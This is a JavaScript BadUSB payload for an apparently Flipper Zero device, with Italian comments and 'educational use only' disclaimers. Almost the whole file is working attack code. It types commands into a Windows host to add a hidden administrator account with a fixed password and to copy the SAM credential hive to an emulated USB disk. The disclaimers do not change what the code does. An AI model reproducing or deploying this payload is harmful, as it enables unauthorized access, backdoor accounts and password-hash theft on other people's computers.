/*
 * Nota: 
 * Questo codice non è stato testato e potrebbe non funzionare come previsto. 
 * L'uso di questo script comporta dei rischi e non è garantita la sua sicurezza o efficacia. 
 * Si consiglia di eseguire sempre test in un ambiente controllato e di prestare attenzione 
 * all'implementazione di tale codice. L'autore non si assume responsabilità per eventuali 
 * danni o problemi causati dall'uso di questo script.
 */

//
//    ██████  ▄████▄   ██▀███   ██▓ ██▓███  ▄▄▄█████▓    ▄▄▄▄   ▓██   ██▓       ██ ▄█▀ ▒█████  ▒███████▒ ▄▄▄       ██ ▄█▀
//  ▒██    ▒ ▒██▀ ▀█  ▓██ ▒ ██▒▓██▒▓██░  ██▒▓  ██▒ ▓▒   ▓█████▄  ▒██  ██▒       ██▄█▒ ▒██▒  ██▒▒ ▒ ▒ ▄▀░▒████▄     ██▄█▒
//  ░ ▓██▄   ▒▓█    ▄ ▓██ ░▄█ ▒▒██▒▓██░ ██▓▒▒ ▓██░ ▒░   ▒██▒ ▄██  ▒██ ██░      ▓███▄░ ▒██░  ██▒░ ▒ ▄▀▒░ ▒██  ▀█▄  ▓███▄░
//    ▒   ██▒▒▓▓▄ ▄██▒▒██▀▀█▄  ░██░▒██▄█▓▒ ▒░ ▓██▓ ░    ▒██░█▀    ░ ▐██▓░      ▓██ █▄ ▒██   ██░  ▄▀▒   ░░██▄▄▄▄██ ▓██ █▄
//  ▒██████▒▒▒ ▓███▀ ░░██▓ ▒██▒░██░▒██▒ ░  ░  ▒██▒ ░    ░▓█  ▀█▓  ░ ██▒▓░      ▒██▒ █▄░ ████▓▒░▒███████▒ ▓█   ▓██▒▒██▒ █▄
//  ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░░▓  ▒▓▒░ ░  ░  ▒ ░░      ░▒▓███▀▒   ██▒▒▒       ▒ ▒▒ ▓▒░ ▒░▒░▒░ ░▒▒ ▓░▒░▒ ▒▒   ▓▒█░▒ ▒▒ ▓▒
//  ░ ░▒  ░ ░  ░  ▒     ░▒ ░ ▒░ ▒ ░░▒ ░         ░       ▒░▒   ░  ▓██ ░▒░       ░ ░▒ ▒░  ░ ▒ ▒░ ░░▒ ▒ ░ ▒  ▒   ▒▒ ░░ ░▒ ▒░
//  ░  ░  ░  ░          ░░   ░  ▒ ░░░         ░          ░    ░  ▒ ▒ ░░        ░ ░░ ░ ░ ░ ░ ▒  ░ ░ ░ ░ ░  ░   ▒   ░ ░░ ░
//        ░  ░ ░         ░      ░                        ░       ░ ░           ░  ░       ░ ░    ░ ░          ░  ░░  ░
//           ░                                                ░  ░ ░                           ░
//
//
// official source: https://github.com/kozqk/backdoor
//
// **********************************************************************
//                       DISCLAIMER
// **********************************************************************
//              QUESTO SCRIPT É FORNITO SOLO A SCOPO DIDATTICO.
// **********************************************************************
// Utilizzalo solo in ambienti controllati e con permessi appropriati.
// L'uso improprio o non autorizzato di questo codice può violare le leggi
// e regolamenti locali o internazionali.
// **********************************************************************
// L'autore di questo codice non è responsabile per eventuali danni,
// perdite o conseguenze legali derivanti dall'uso improprio.
// **********************************************************************
// Prima di utilizzare qualsiasi parte di questo script, verifica di avere
// l'autorizzazione esplicita dal proprietario del sistema da testare.
// **********************************************************************
// Questa versione dello script è progettata per essere utilizzata solo a
// scopo di ricerca sulla sicurezza informatica e apprendimento.
// **********************************************************************

/*
 * Descrizione del codice: 
 *
 * Questo script utilizza un dispositivo BadUSB per eseguire attacchi automatizzati su un sistema Windows. 
 * È progettato per creare un nuovo utente amministratore e per esfiltrare il file SAM, che contiene le 
 * informazioni degli account utente e le loro password criptate.
 * 
 * Funzionalità principali:
 * 
 * 1. Importazione delle librerie:
 *    - Lo script inizia importando diverse librerie necessarie per la sua esecuzione:
 *      - badusb: gestisce la simulazione della tastiera e l'invio di comandi al sistema.
 *      - usbdisk: consente la gestione di una memoria USB virtuale per l'esfiltrazione dei dati.
 *      - storage: controlla l'esistenza e la creazione di immagini disco.
 *      - dialog: mostra dialoghi interattivi per confermare l'azione dell'utente.
 * 
 * 2. Impostazione del layout della tastiera:
 *    - Il layout della tastiera è impostato su italiano (it-IT), il che significa che i comandi 
 *      verranno inviati al sistema in questo formato.
 * 
 * 3. Funzione sendToConsole(script):
 *    - Questa funzione prende un array di comandi (script) e li esegue uno dopo l'altro. 
 *      Per ogni comando, se è presente un messaggio informativo, lo stampa sullo schermo. 
 *      Se è specificato un ritardo, lo applica prima di eseguire il comando successivo.
 * 
 * 4. Definizione dello storage:
 *    - Viene definito il nome e la dimensione dell'immagine del disco virtuale (WINPAYLOAD, 16 MB). 
 *      Questo disco virtuale sarà utilizzato per memorizzare i dati esfiltrati, in questo caso, il file SAM.
 * 
 * 5. Script primario: Creazione di un utente amministratore:
 *    - Viene definito uno script primario contenente una serie di comandi per creare un nuovo utente 
 *      amministratore. I comandi inclusi sono:
 *      - Aprire il Prompt dei Comandi (cmd).
 *      - Creare un nuovo utente con nome (elliot) e password (FSociety!).
 *      - Aggiungere il nuovo utente al gruppo degli amministratori, conferendogli privilegi elevati.
 * 
 * 6. Script secondario: Esfiltrazione del file SAM:
 *    - Un secondo script è definito per copiare il file SAM dalla directory di sistema a un percorso 
 *      sulla USB virtuale. I comandi includono:
 *      - Copiare il file C:\Windows\System32\config\SAM e salvarlo in E:\sam_copy.
 *      - Sincronizzare e smontare la USB virtuale dopo la copia per garantire che i dati siano 
 *        correttamente scritti e disponibili.
 * 
 * 7. Preparazione dello storage:
 *    - Prima di eseguire gli script, il codice verifica se l'immagine del disco virtuale esiste. 
 *      Se non esiste, la crea utilizzando la libreria usbdisk.
 * 
 * 8. Configurazione di BadUSB:
 *    - Viene configurato il dispositivo BadUSB con identificatori univoci per il produttore e 
 *      il prodotto e si specifica il layout della tastiera. Questo prepara il dispositivo per 
 *      inviare comandi al sistema host.
 * 
 * 9. Dialogo di conferma:
 *    - Viene visualizzato un dialogo per confermare all'utente che il dispositivo BadUSB è pronto 
 *      e chiede di premere OK per avviare il payload.
 * 
 * 10. Esecuzione degli script:
 *     - Una volta confermato, lo script esegue prima il comando primario per la creazione dell'utente 
 *       e successivamente il comando secondario per l'esfiltrazione del file SAM.
 * 
 * 11. Rimozione della tastiera virtuale:
 *     - Dopo che entrambi gli script sono stati eseguiti, il dispositivo BadUSB viene disconnesso, 
 *       rimuovendo la tastiera virtuale dal sistema host.
 * 
 * 12. Avvio e smontaggio del disco USB virtuale:
 *     - Infine, lo script avvia il disco USB virtuale e attende che venga espulso. 
 *       Questo assicura che tutti i dati siano stati correttamente scritti e che il dispositivo 
 *       possa essere rimosso in sicurezza.
 * 
 * Come si usa:
 * 
 * - Ambiente di esecuzione: Questo script deve essere eseguito in un ambiente di test sicuro 
 *   dove si hanno i diritti necessari. Non deve essere utilizzato su sistemi senza autorizzazione, 
 *   poiché ciò costituisce un'attività illecita.
 * - Prerequisiti: Assicurati che il dispositivo BadUSB sia correttamente configurato e che 
 *   tu abbia accesso a un sistema Windows.
 * - Esecuzione: Avvia il codice e segui le istruzioni. Assicurati di prestare attenzione 
 *   al dialogo di conferma prima di avviare il payload, per essere consapevole delle azioni 
 *   che verranno intraprese.
 * - Rispetto delle leggi: È fondamentale utilizzare questo tipo di script solo per scopi 
 *   legittimi e didattici, in conformità con le normative locali e internazionali. 
 *   L'uso improprio potrebbe comportare conseguenze legali.
 * 
 * 
 *  BUON DIVERTIMENTO ;) 
 *  ~Kozak
 * 
*/



let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");
let dialog = require("dialog");

let layout = "it-IT";

// ************
// Funzione per inviare comandi e messaggi con eventuali ritardi.
function sendToConsole(script) {
    for (let i = 0; i < script.length; i++) {
        if (script[i].message) print(script[i].message); // Messaggio sullo schermo del Flipper
        badusb.println(script[i].command);               // Comando da eseguire
        if (script[i].delay) delay(script[i].delay);     // Ritardo opzionale
    }
}

// ************
// Definizione dello storage per esfiltrare dati
let imageName = "FSOCIETY";
let image = "/ext/apps_data/mass_storage/" + imageName + ".img";
let size = 16 * 1024 * 1024;  // 16 MB

// ************
// Script Primario: Creazione utente amministratore
let adminUser = "elliot";
let adminPassword = "FSociety!";
let primary = [
    { message: "Apertura del Prompt dei Comandi...", command: "start cmd", delay: 1000 },
    { message: "Creazione di un nuovo utente admin...", command: `net user ${adminUser} ${adminPassword} /add`, delay: 1000 },
    { command: `net localgroup administrators ${adminUser} /add`, delay: 500 },
];

// ************
// Script Secondario: Esfiltrazione del file SAM
let secondary = [
    { message: "Copia del file SAM...", command: "copy C:\\Windows\\System32\\config\\SAM E:\\sam_copy", delay: 2000 },
    { message: "Sync e smonta USB...", command: "sync", delay: 1000 },
];

// ************
// Preparazione dello storage
print("Verifica dello storage...");
if (!storage.exists(image)) {
    print("Creazione dell'immagine disco...");
    usbdisk.createImage(image, size);
}

// ************
// Configurazione BadUSB
badusb.setup({
    vid: 0xAAAA, pid: 0xBBBB,
    mfr_name: "Flipper", prod_name: "Zero",
    layout_path: "/ext/badusb/assets/layouts/" + layout + ".kl"
});
print("In attesa di connessione...");

while (!badusb.isConnected()) delay(1000);

// ************
// Dialogo di conferma
dialog.message("BadUSB pronto", "Premi OK per avviare il payload.");

// ************
// Esecuzione del primo script
print("Esecuzione dello script primario...");
sendToConsole(primary);
print("Script primario completato.");
delay(500);

// ************
// Esecuzione del secondo script
print("Esecuzione dello script secondario...");
sendToConsole(secondary);
print("Script secondario completato.");

// ************
// Rimozione della tastiera virtuale
badusb.quit();

// ************
// Avvio e smontaggio del disco USB virtuale
usbdisk.start(image);
print("Attendere fino a quando l'unità non viene espulsa...");
while (!usbdisk.wasEjected()) delay(1000);
usbdisk.stop();

print("Script completato.");
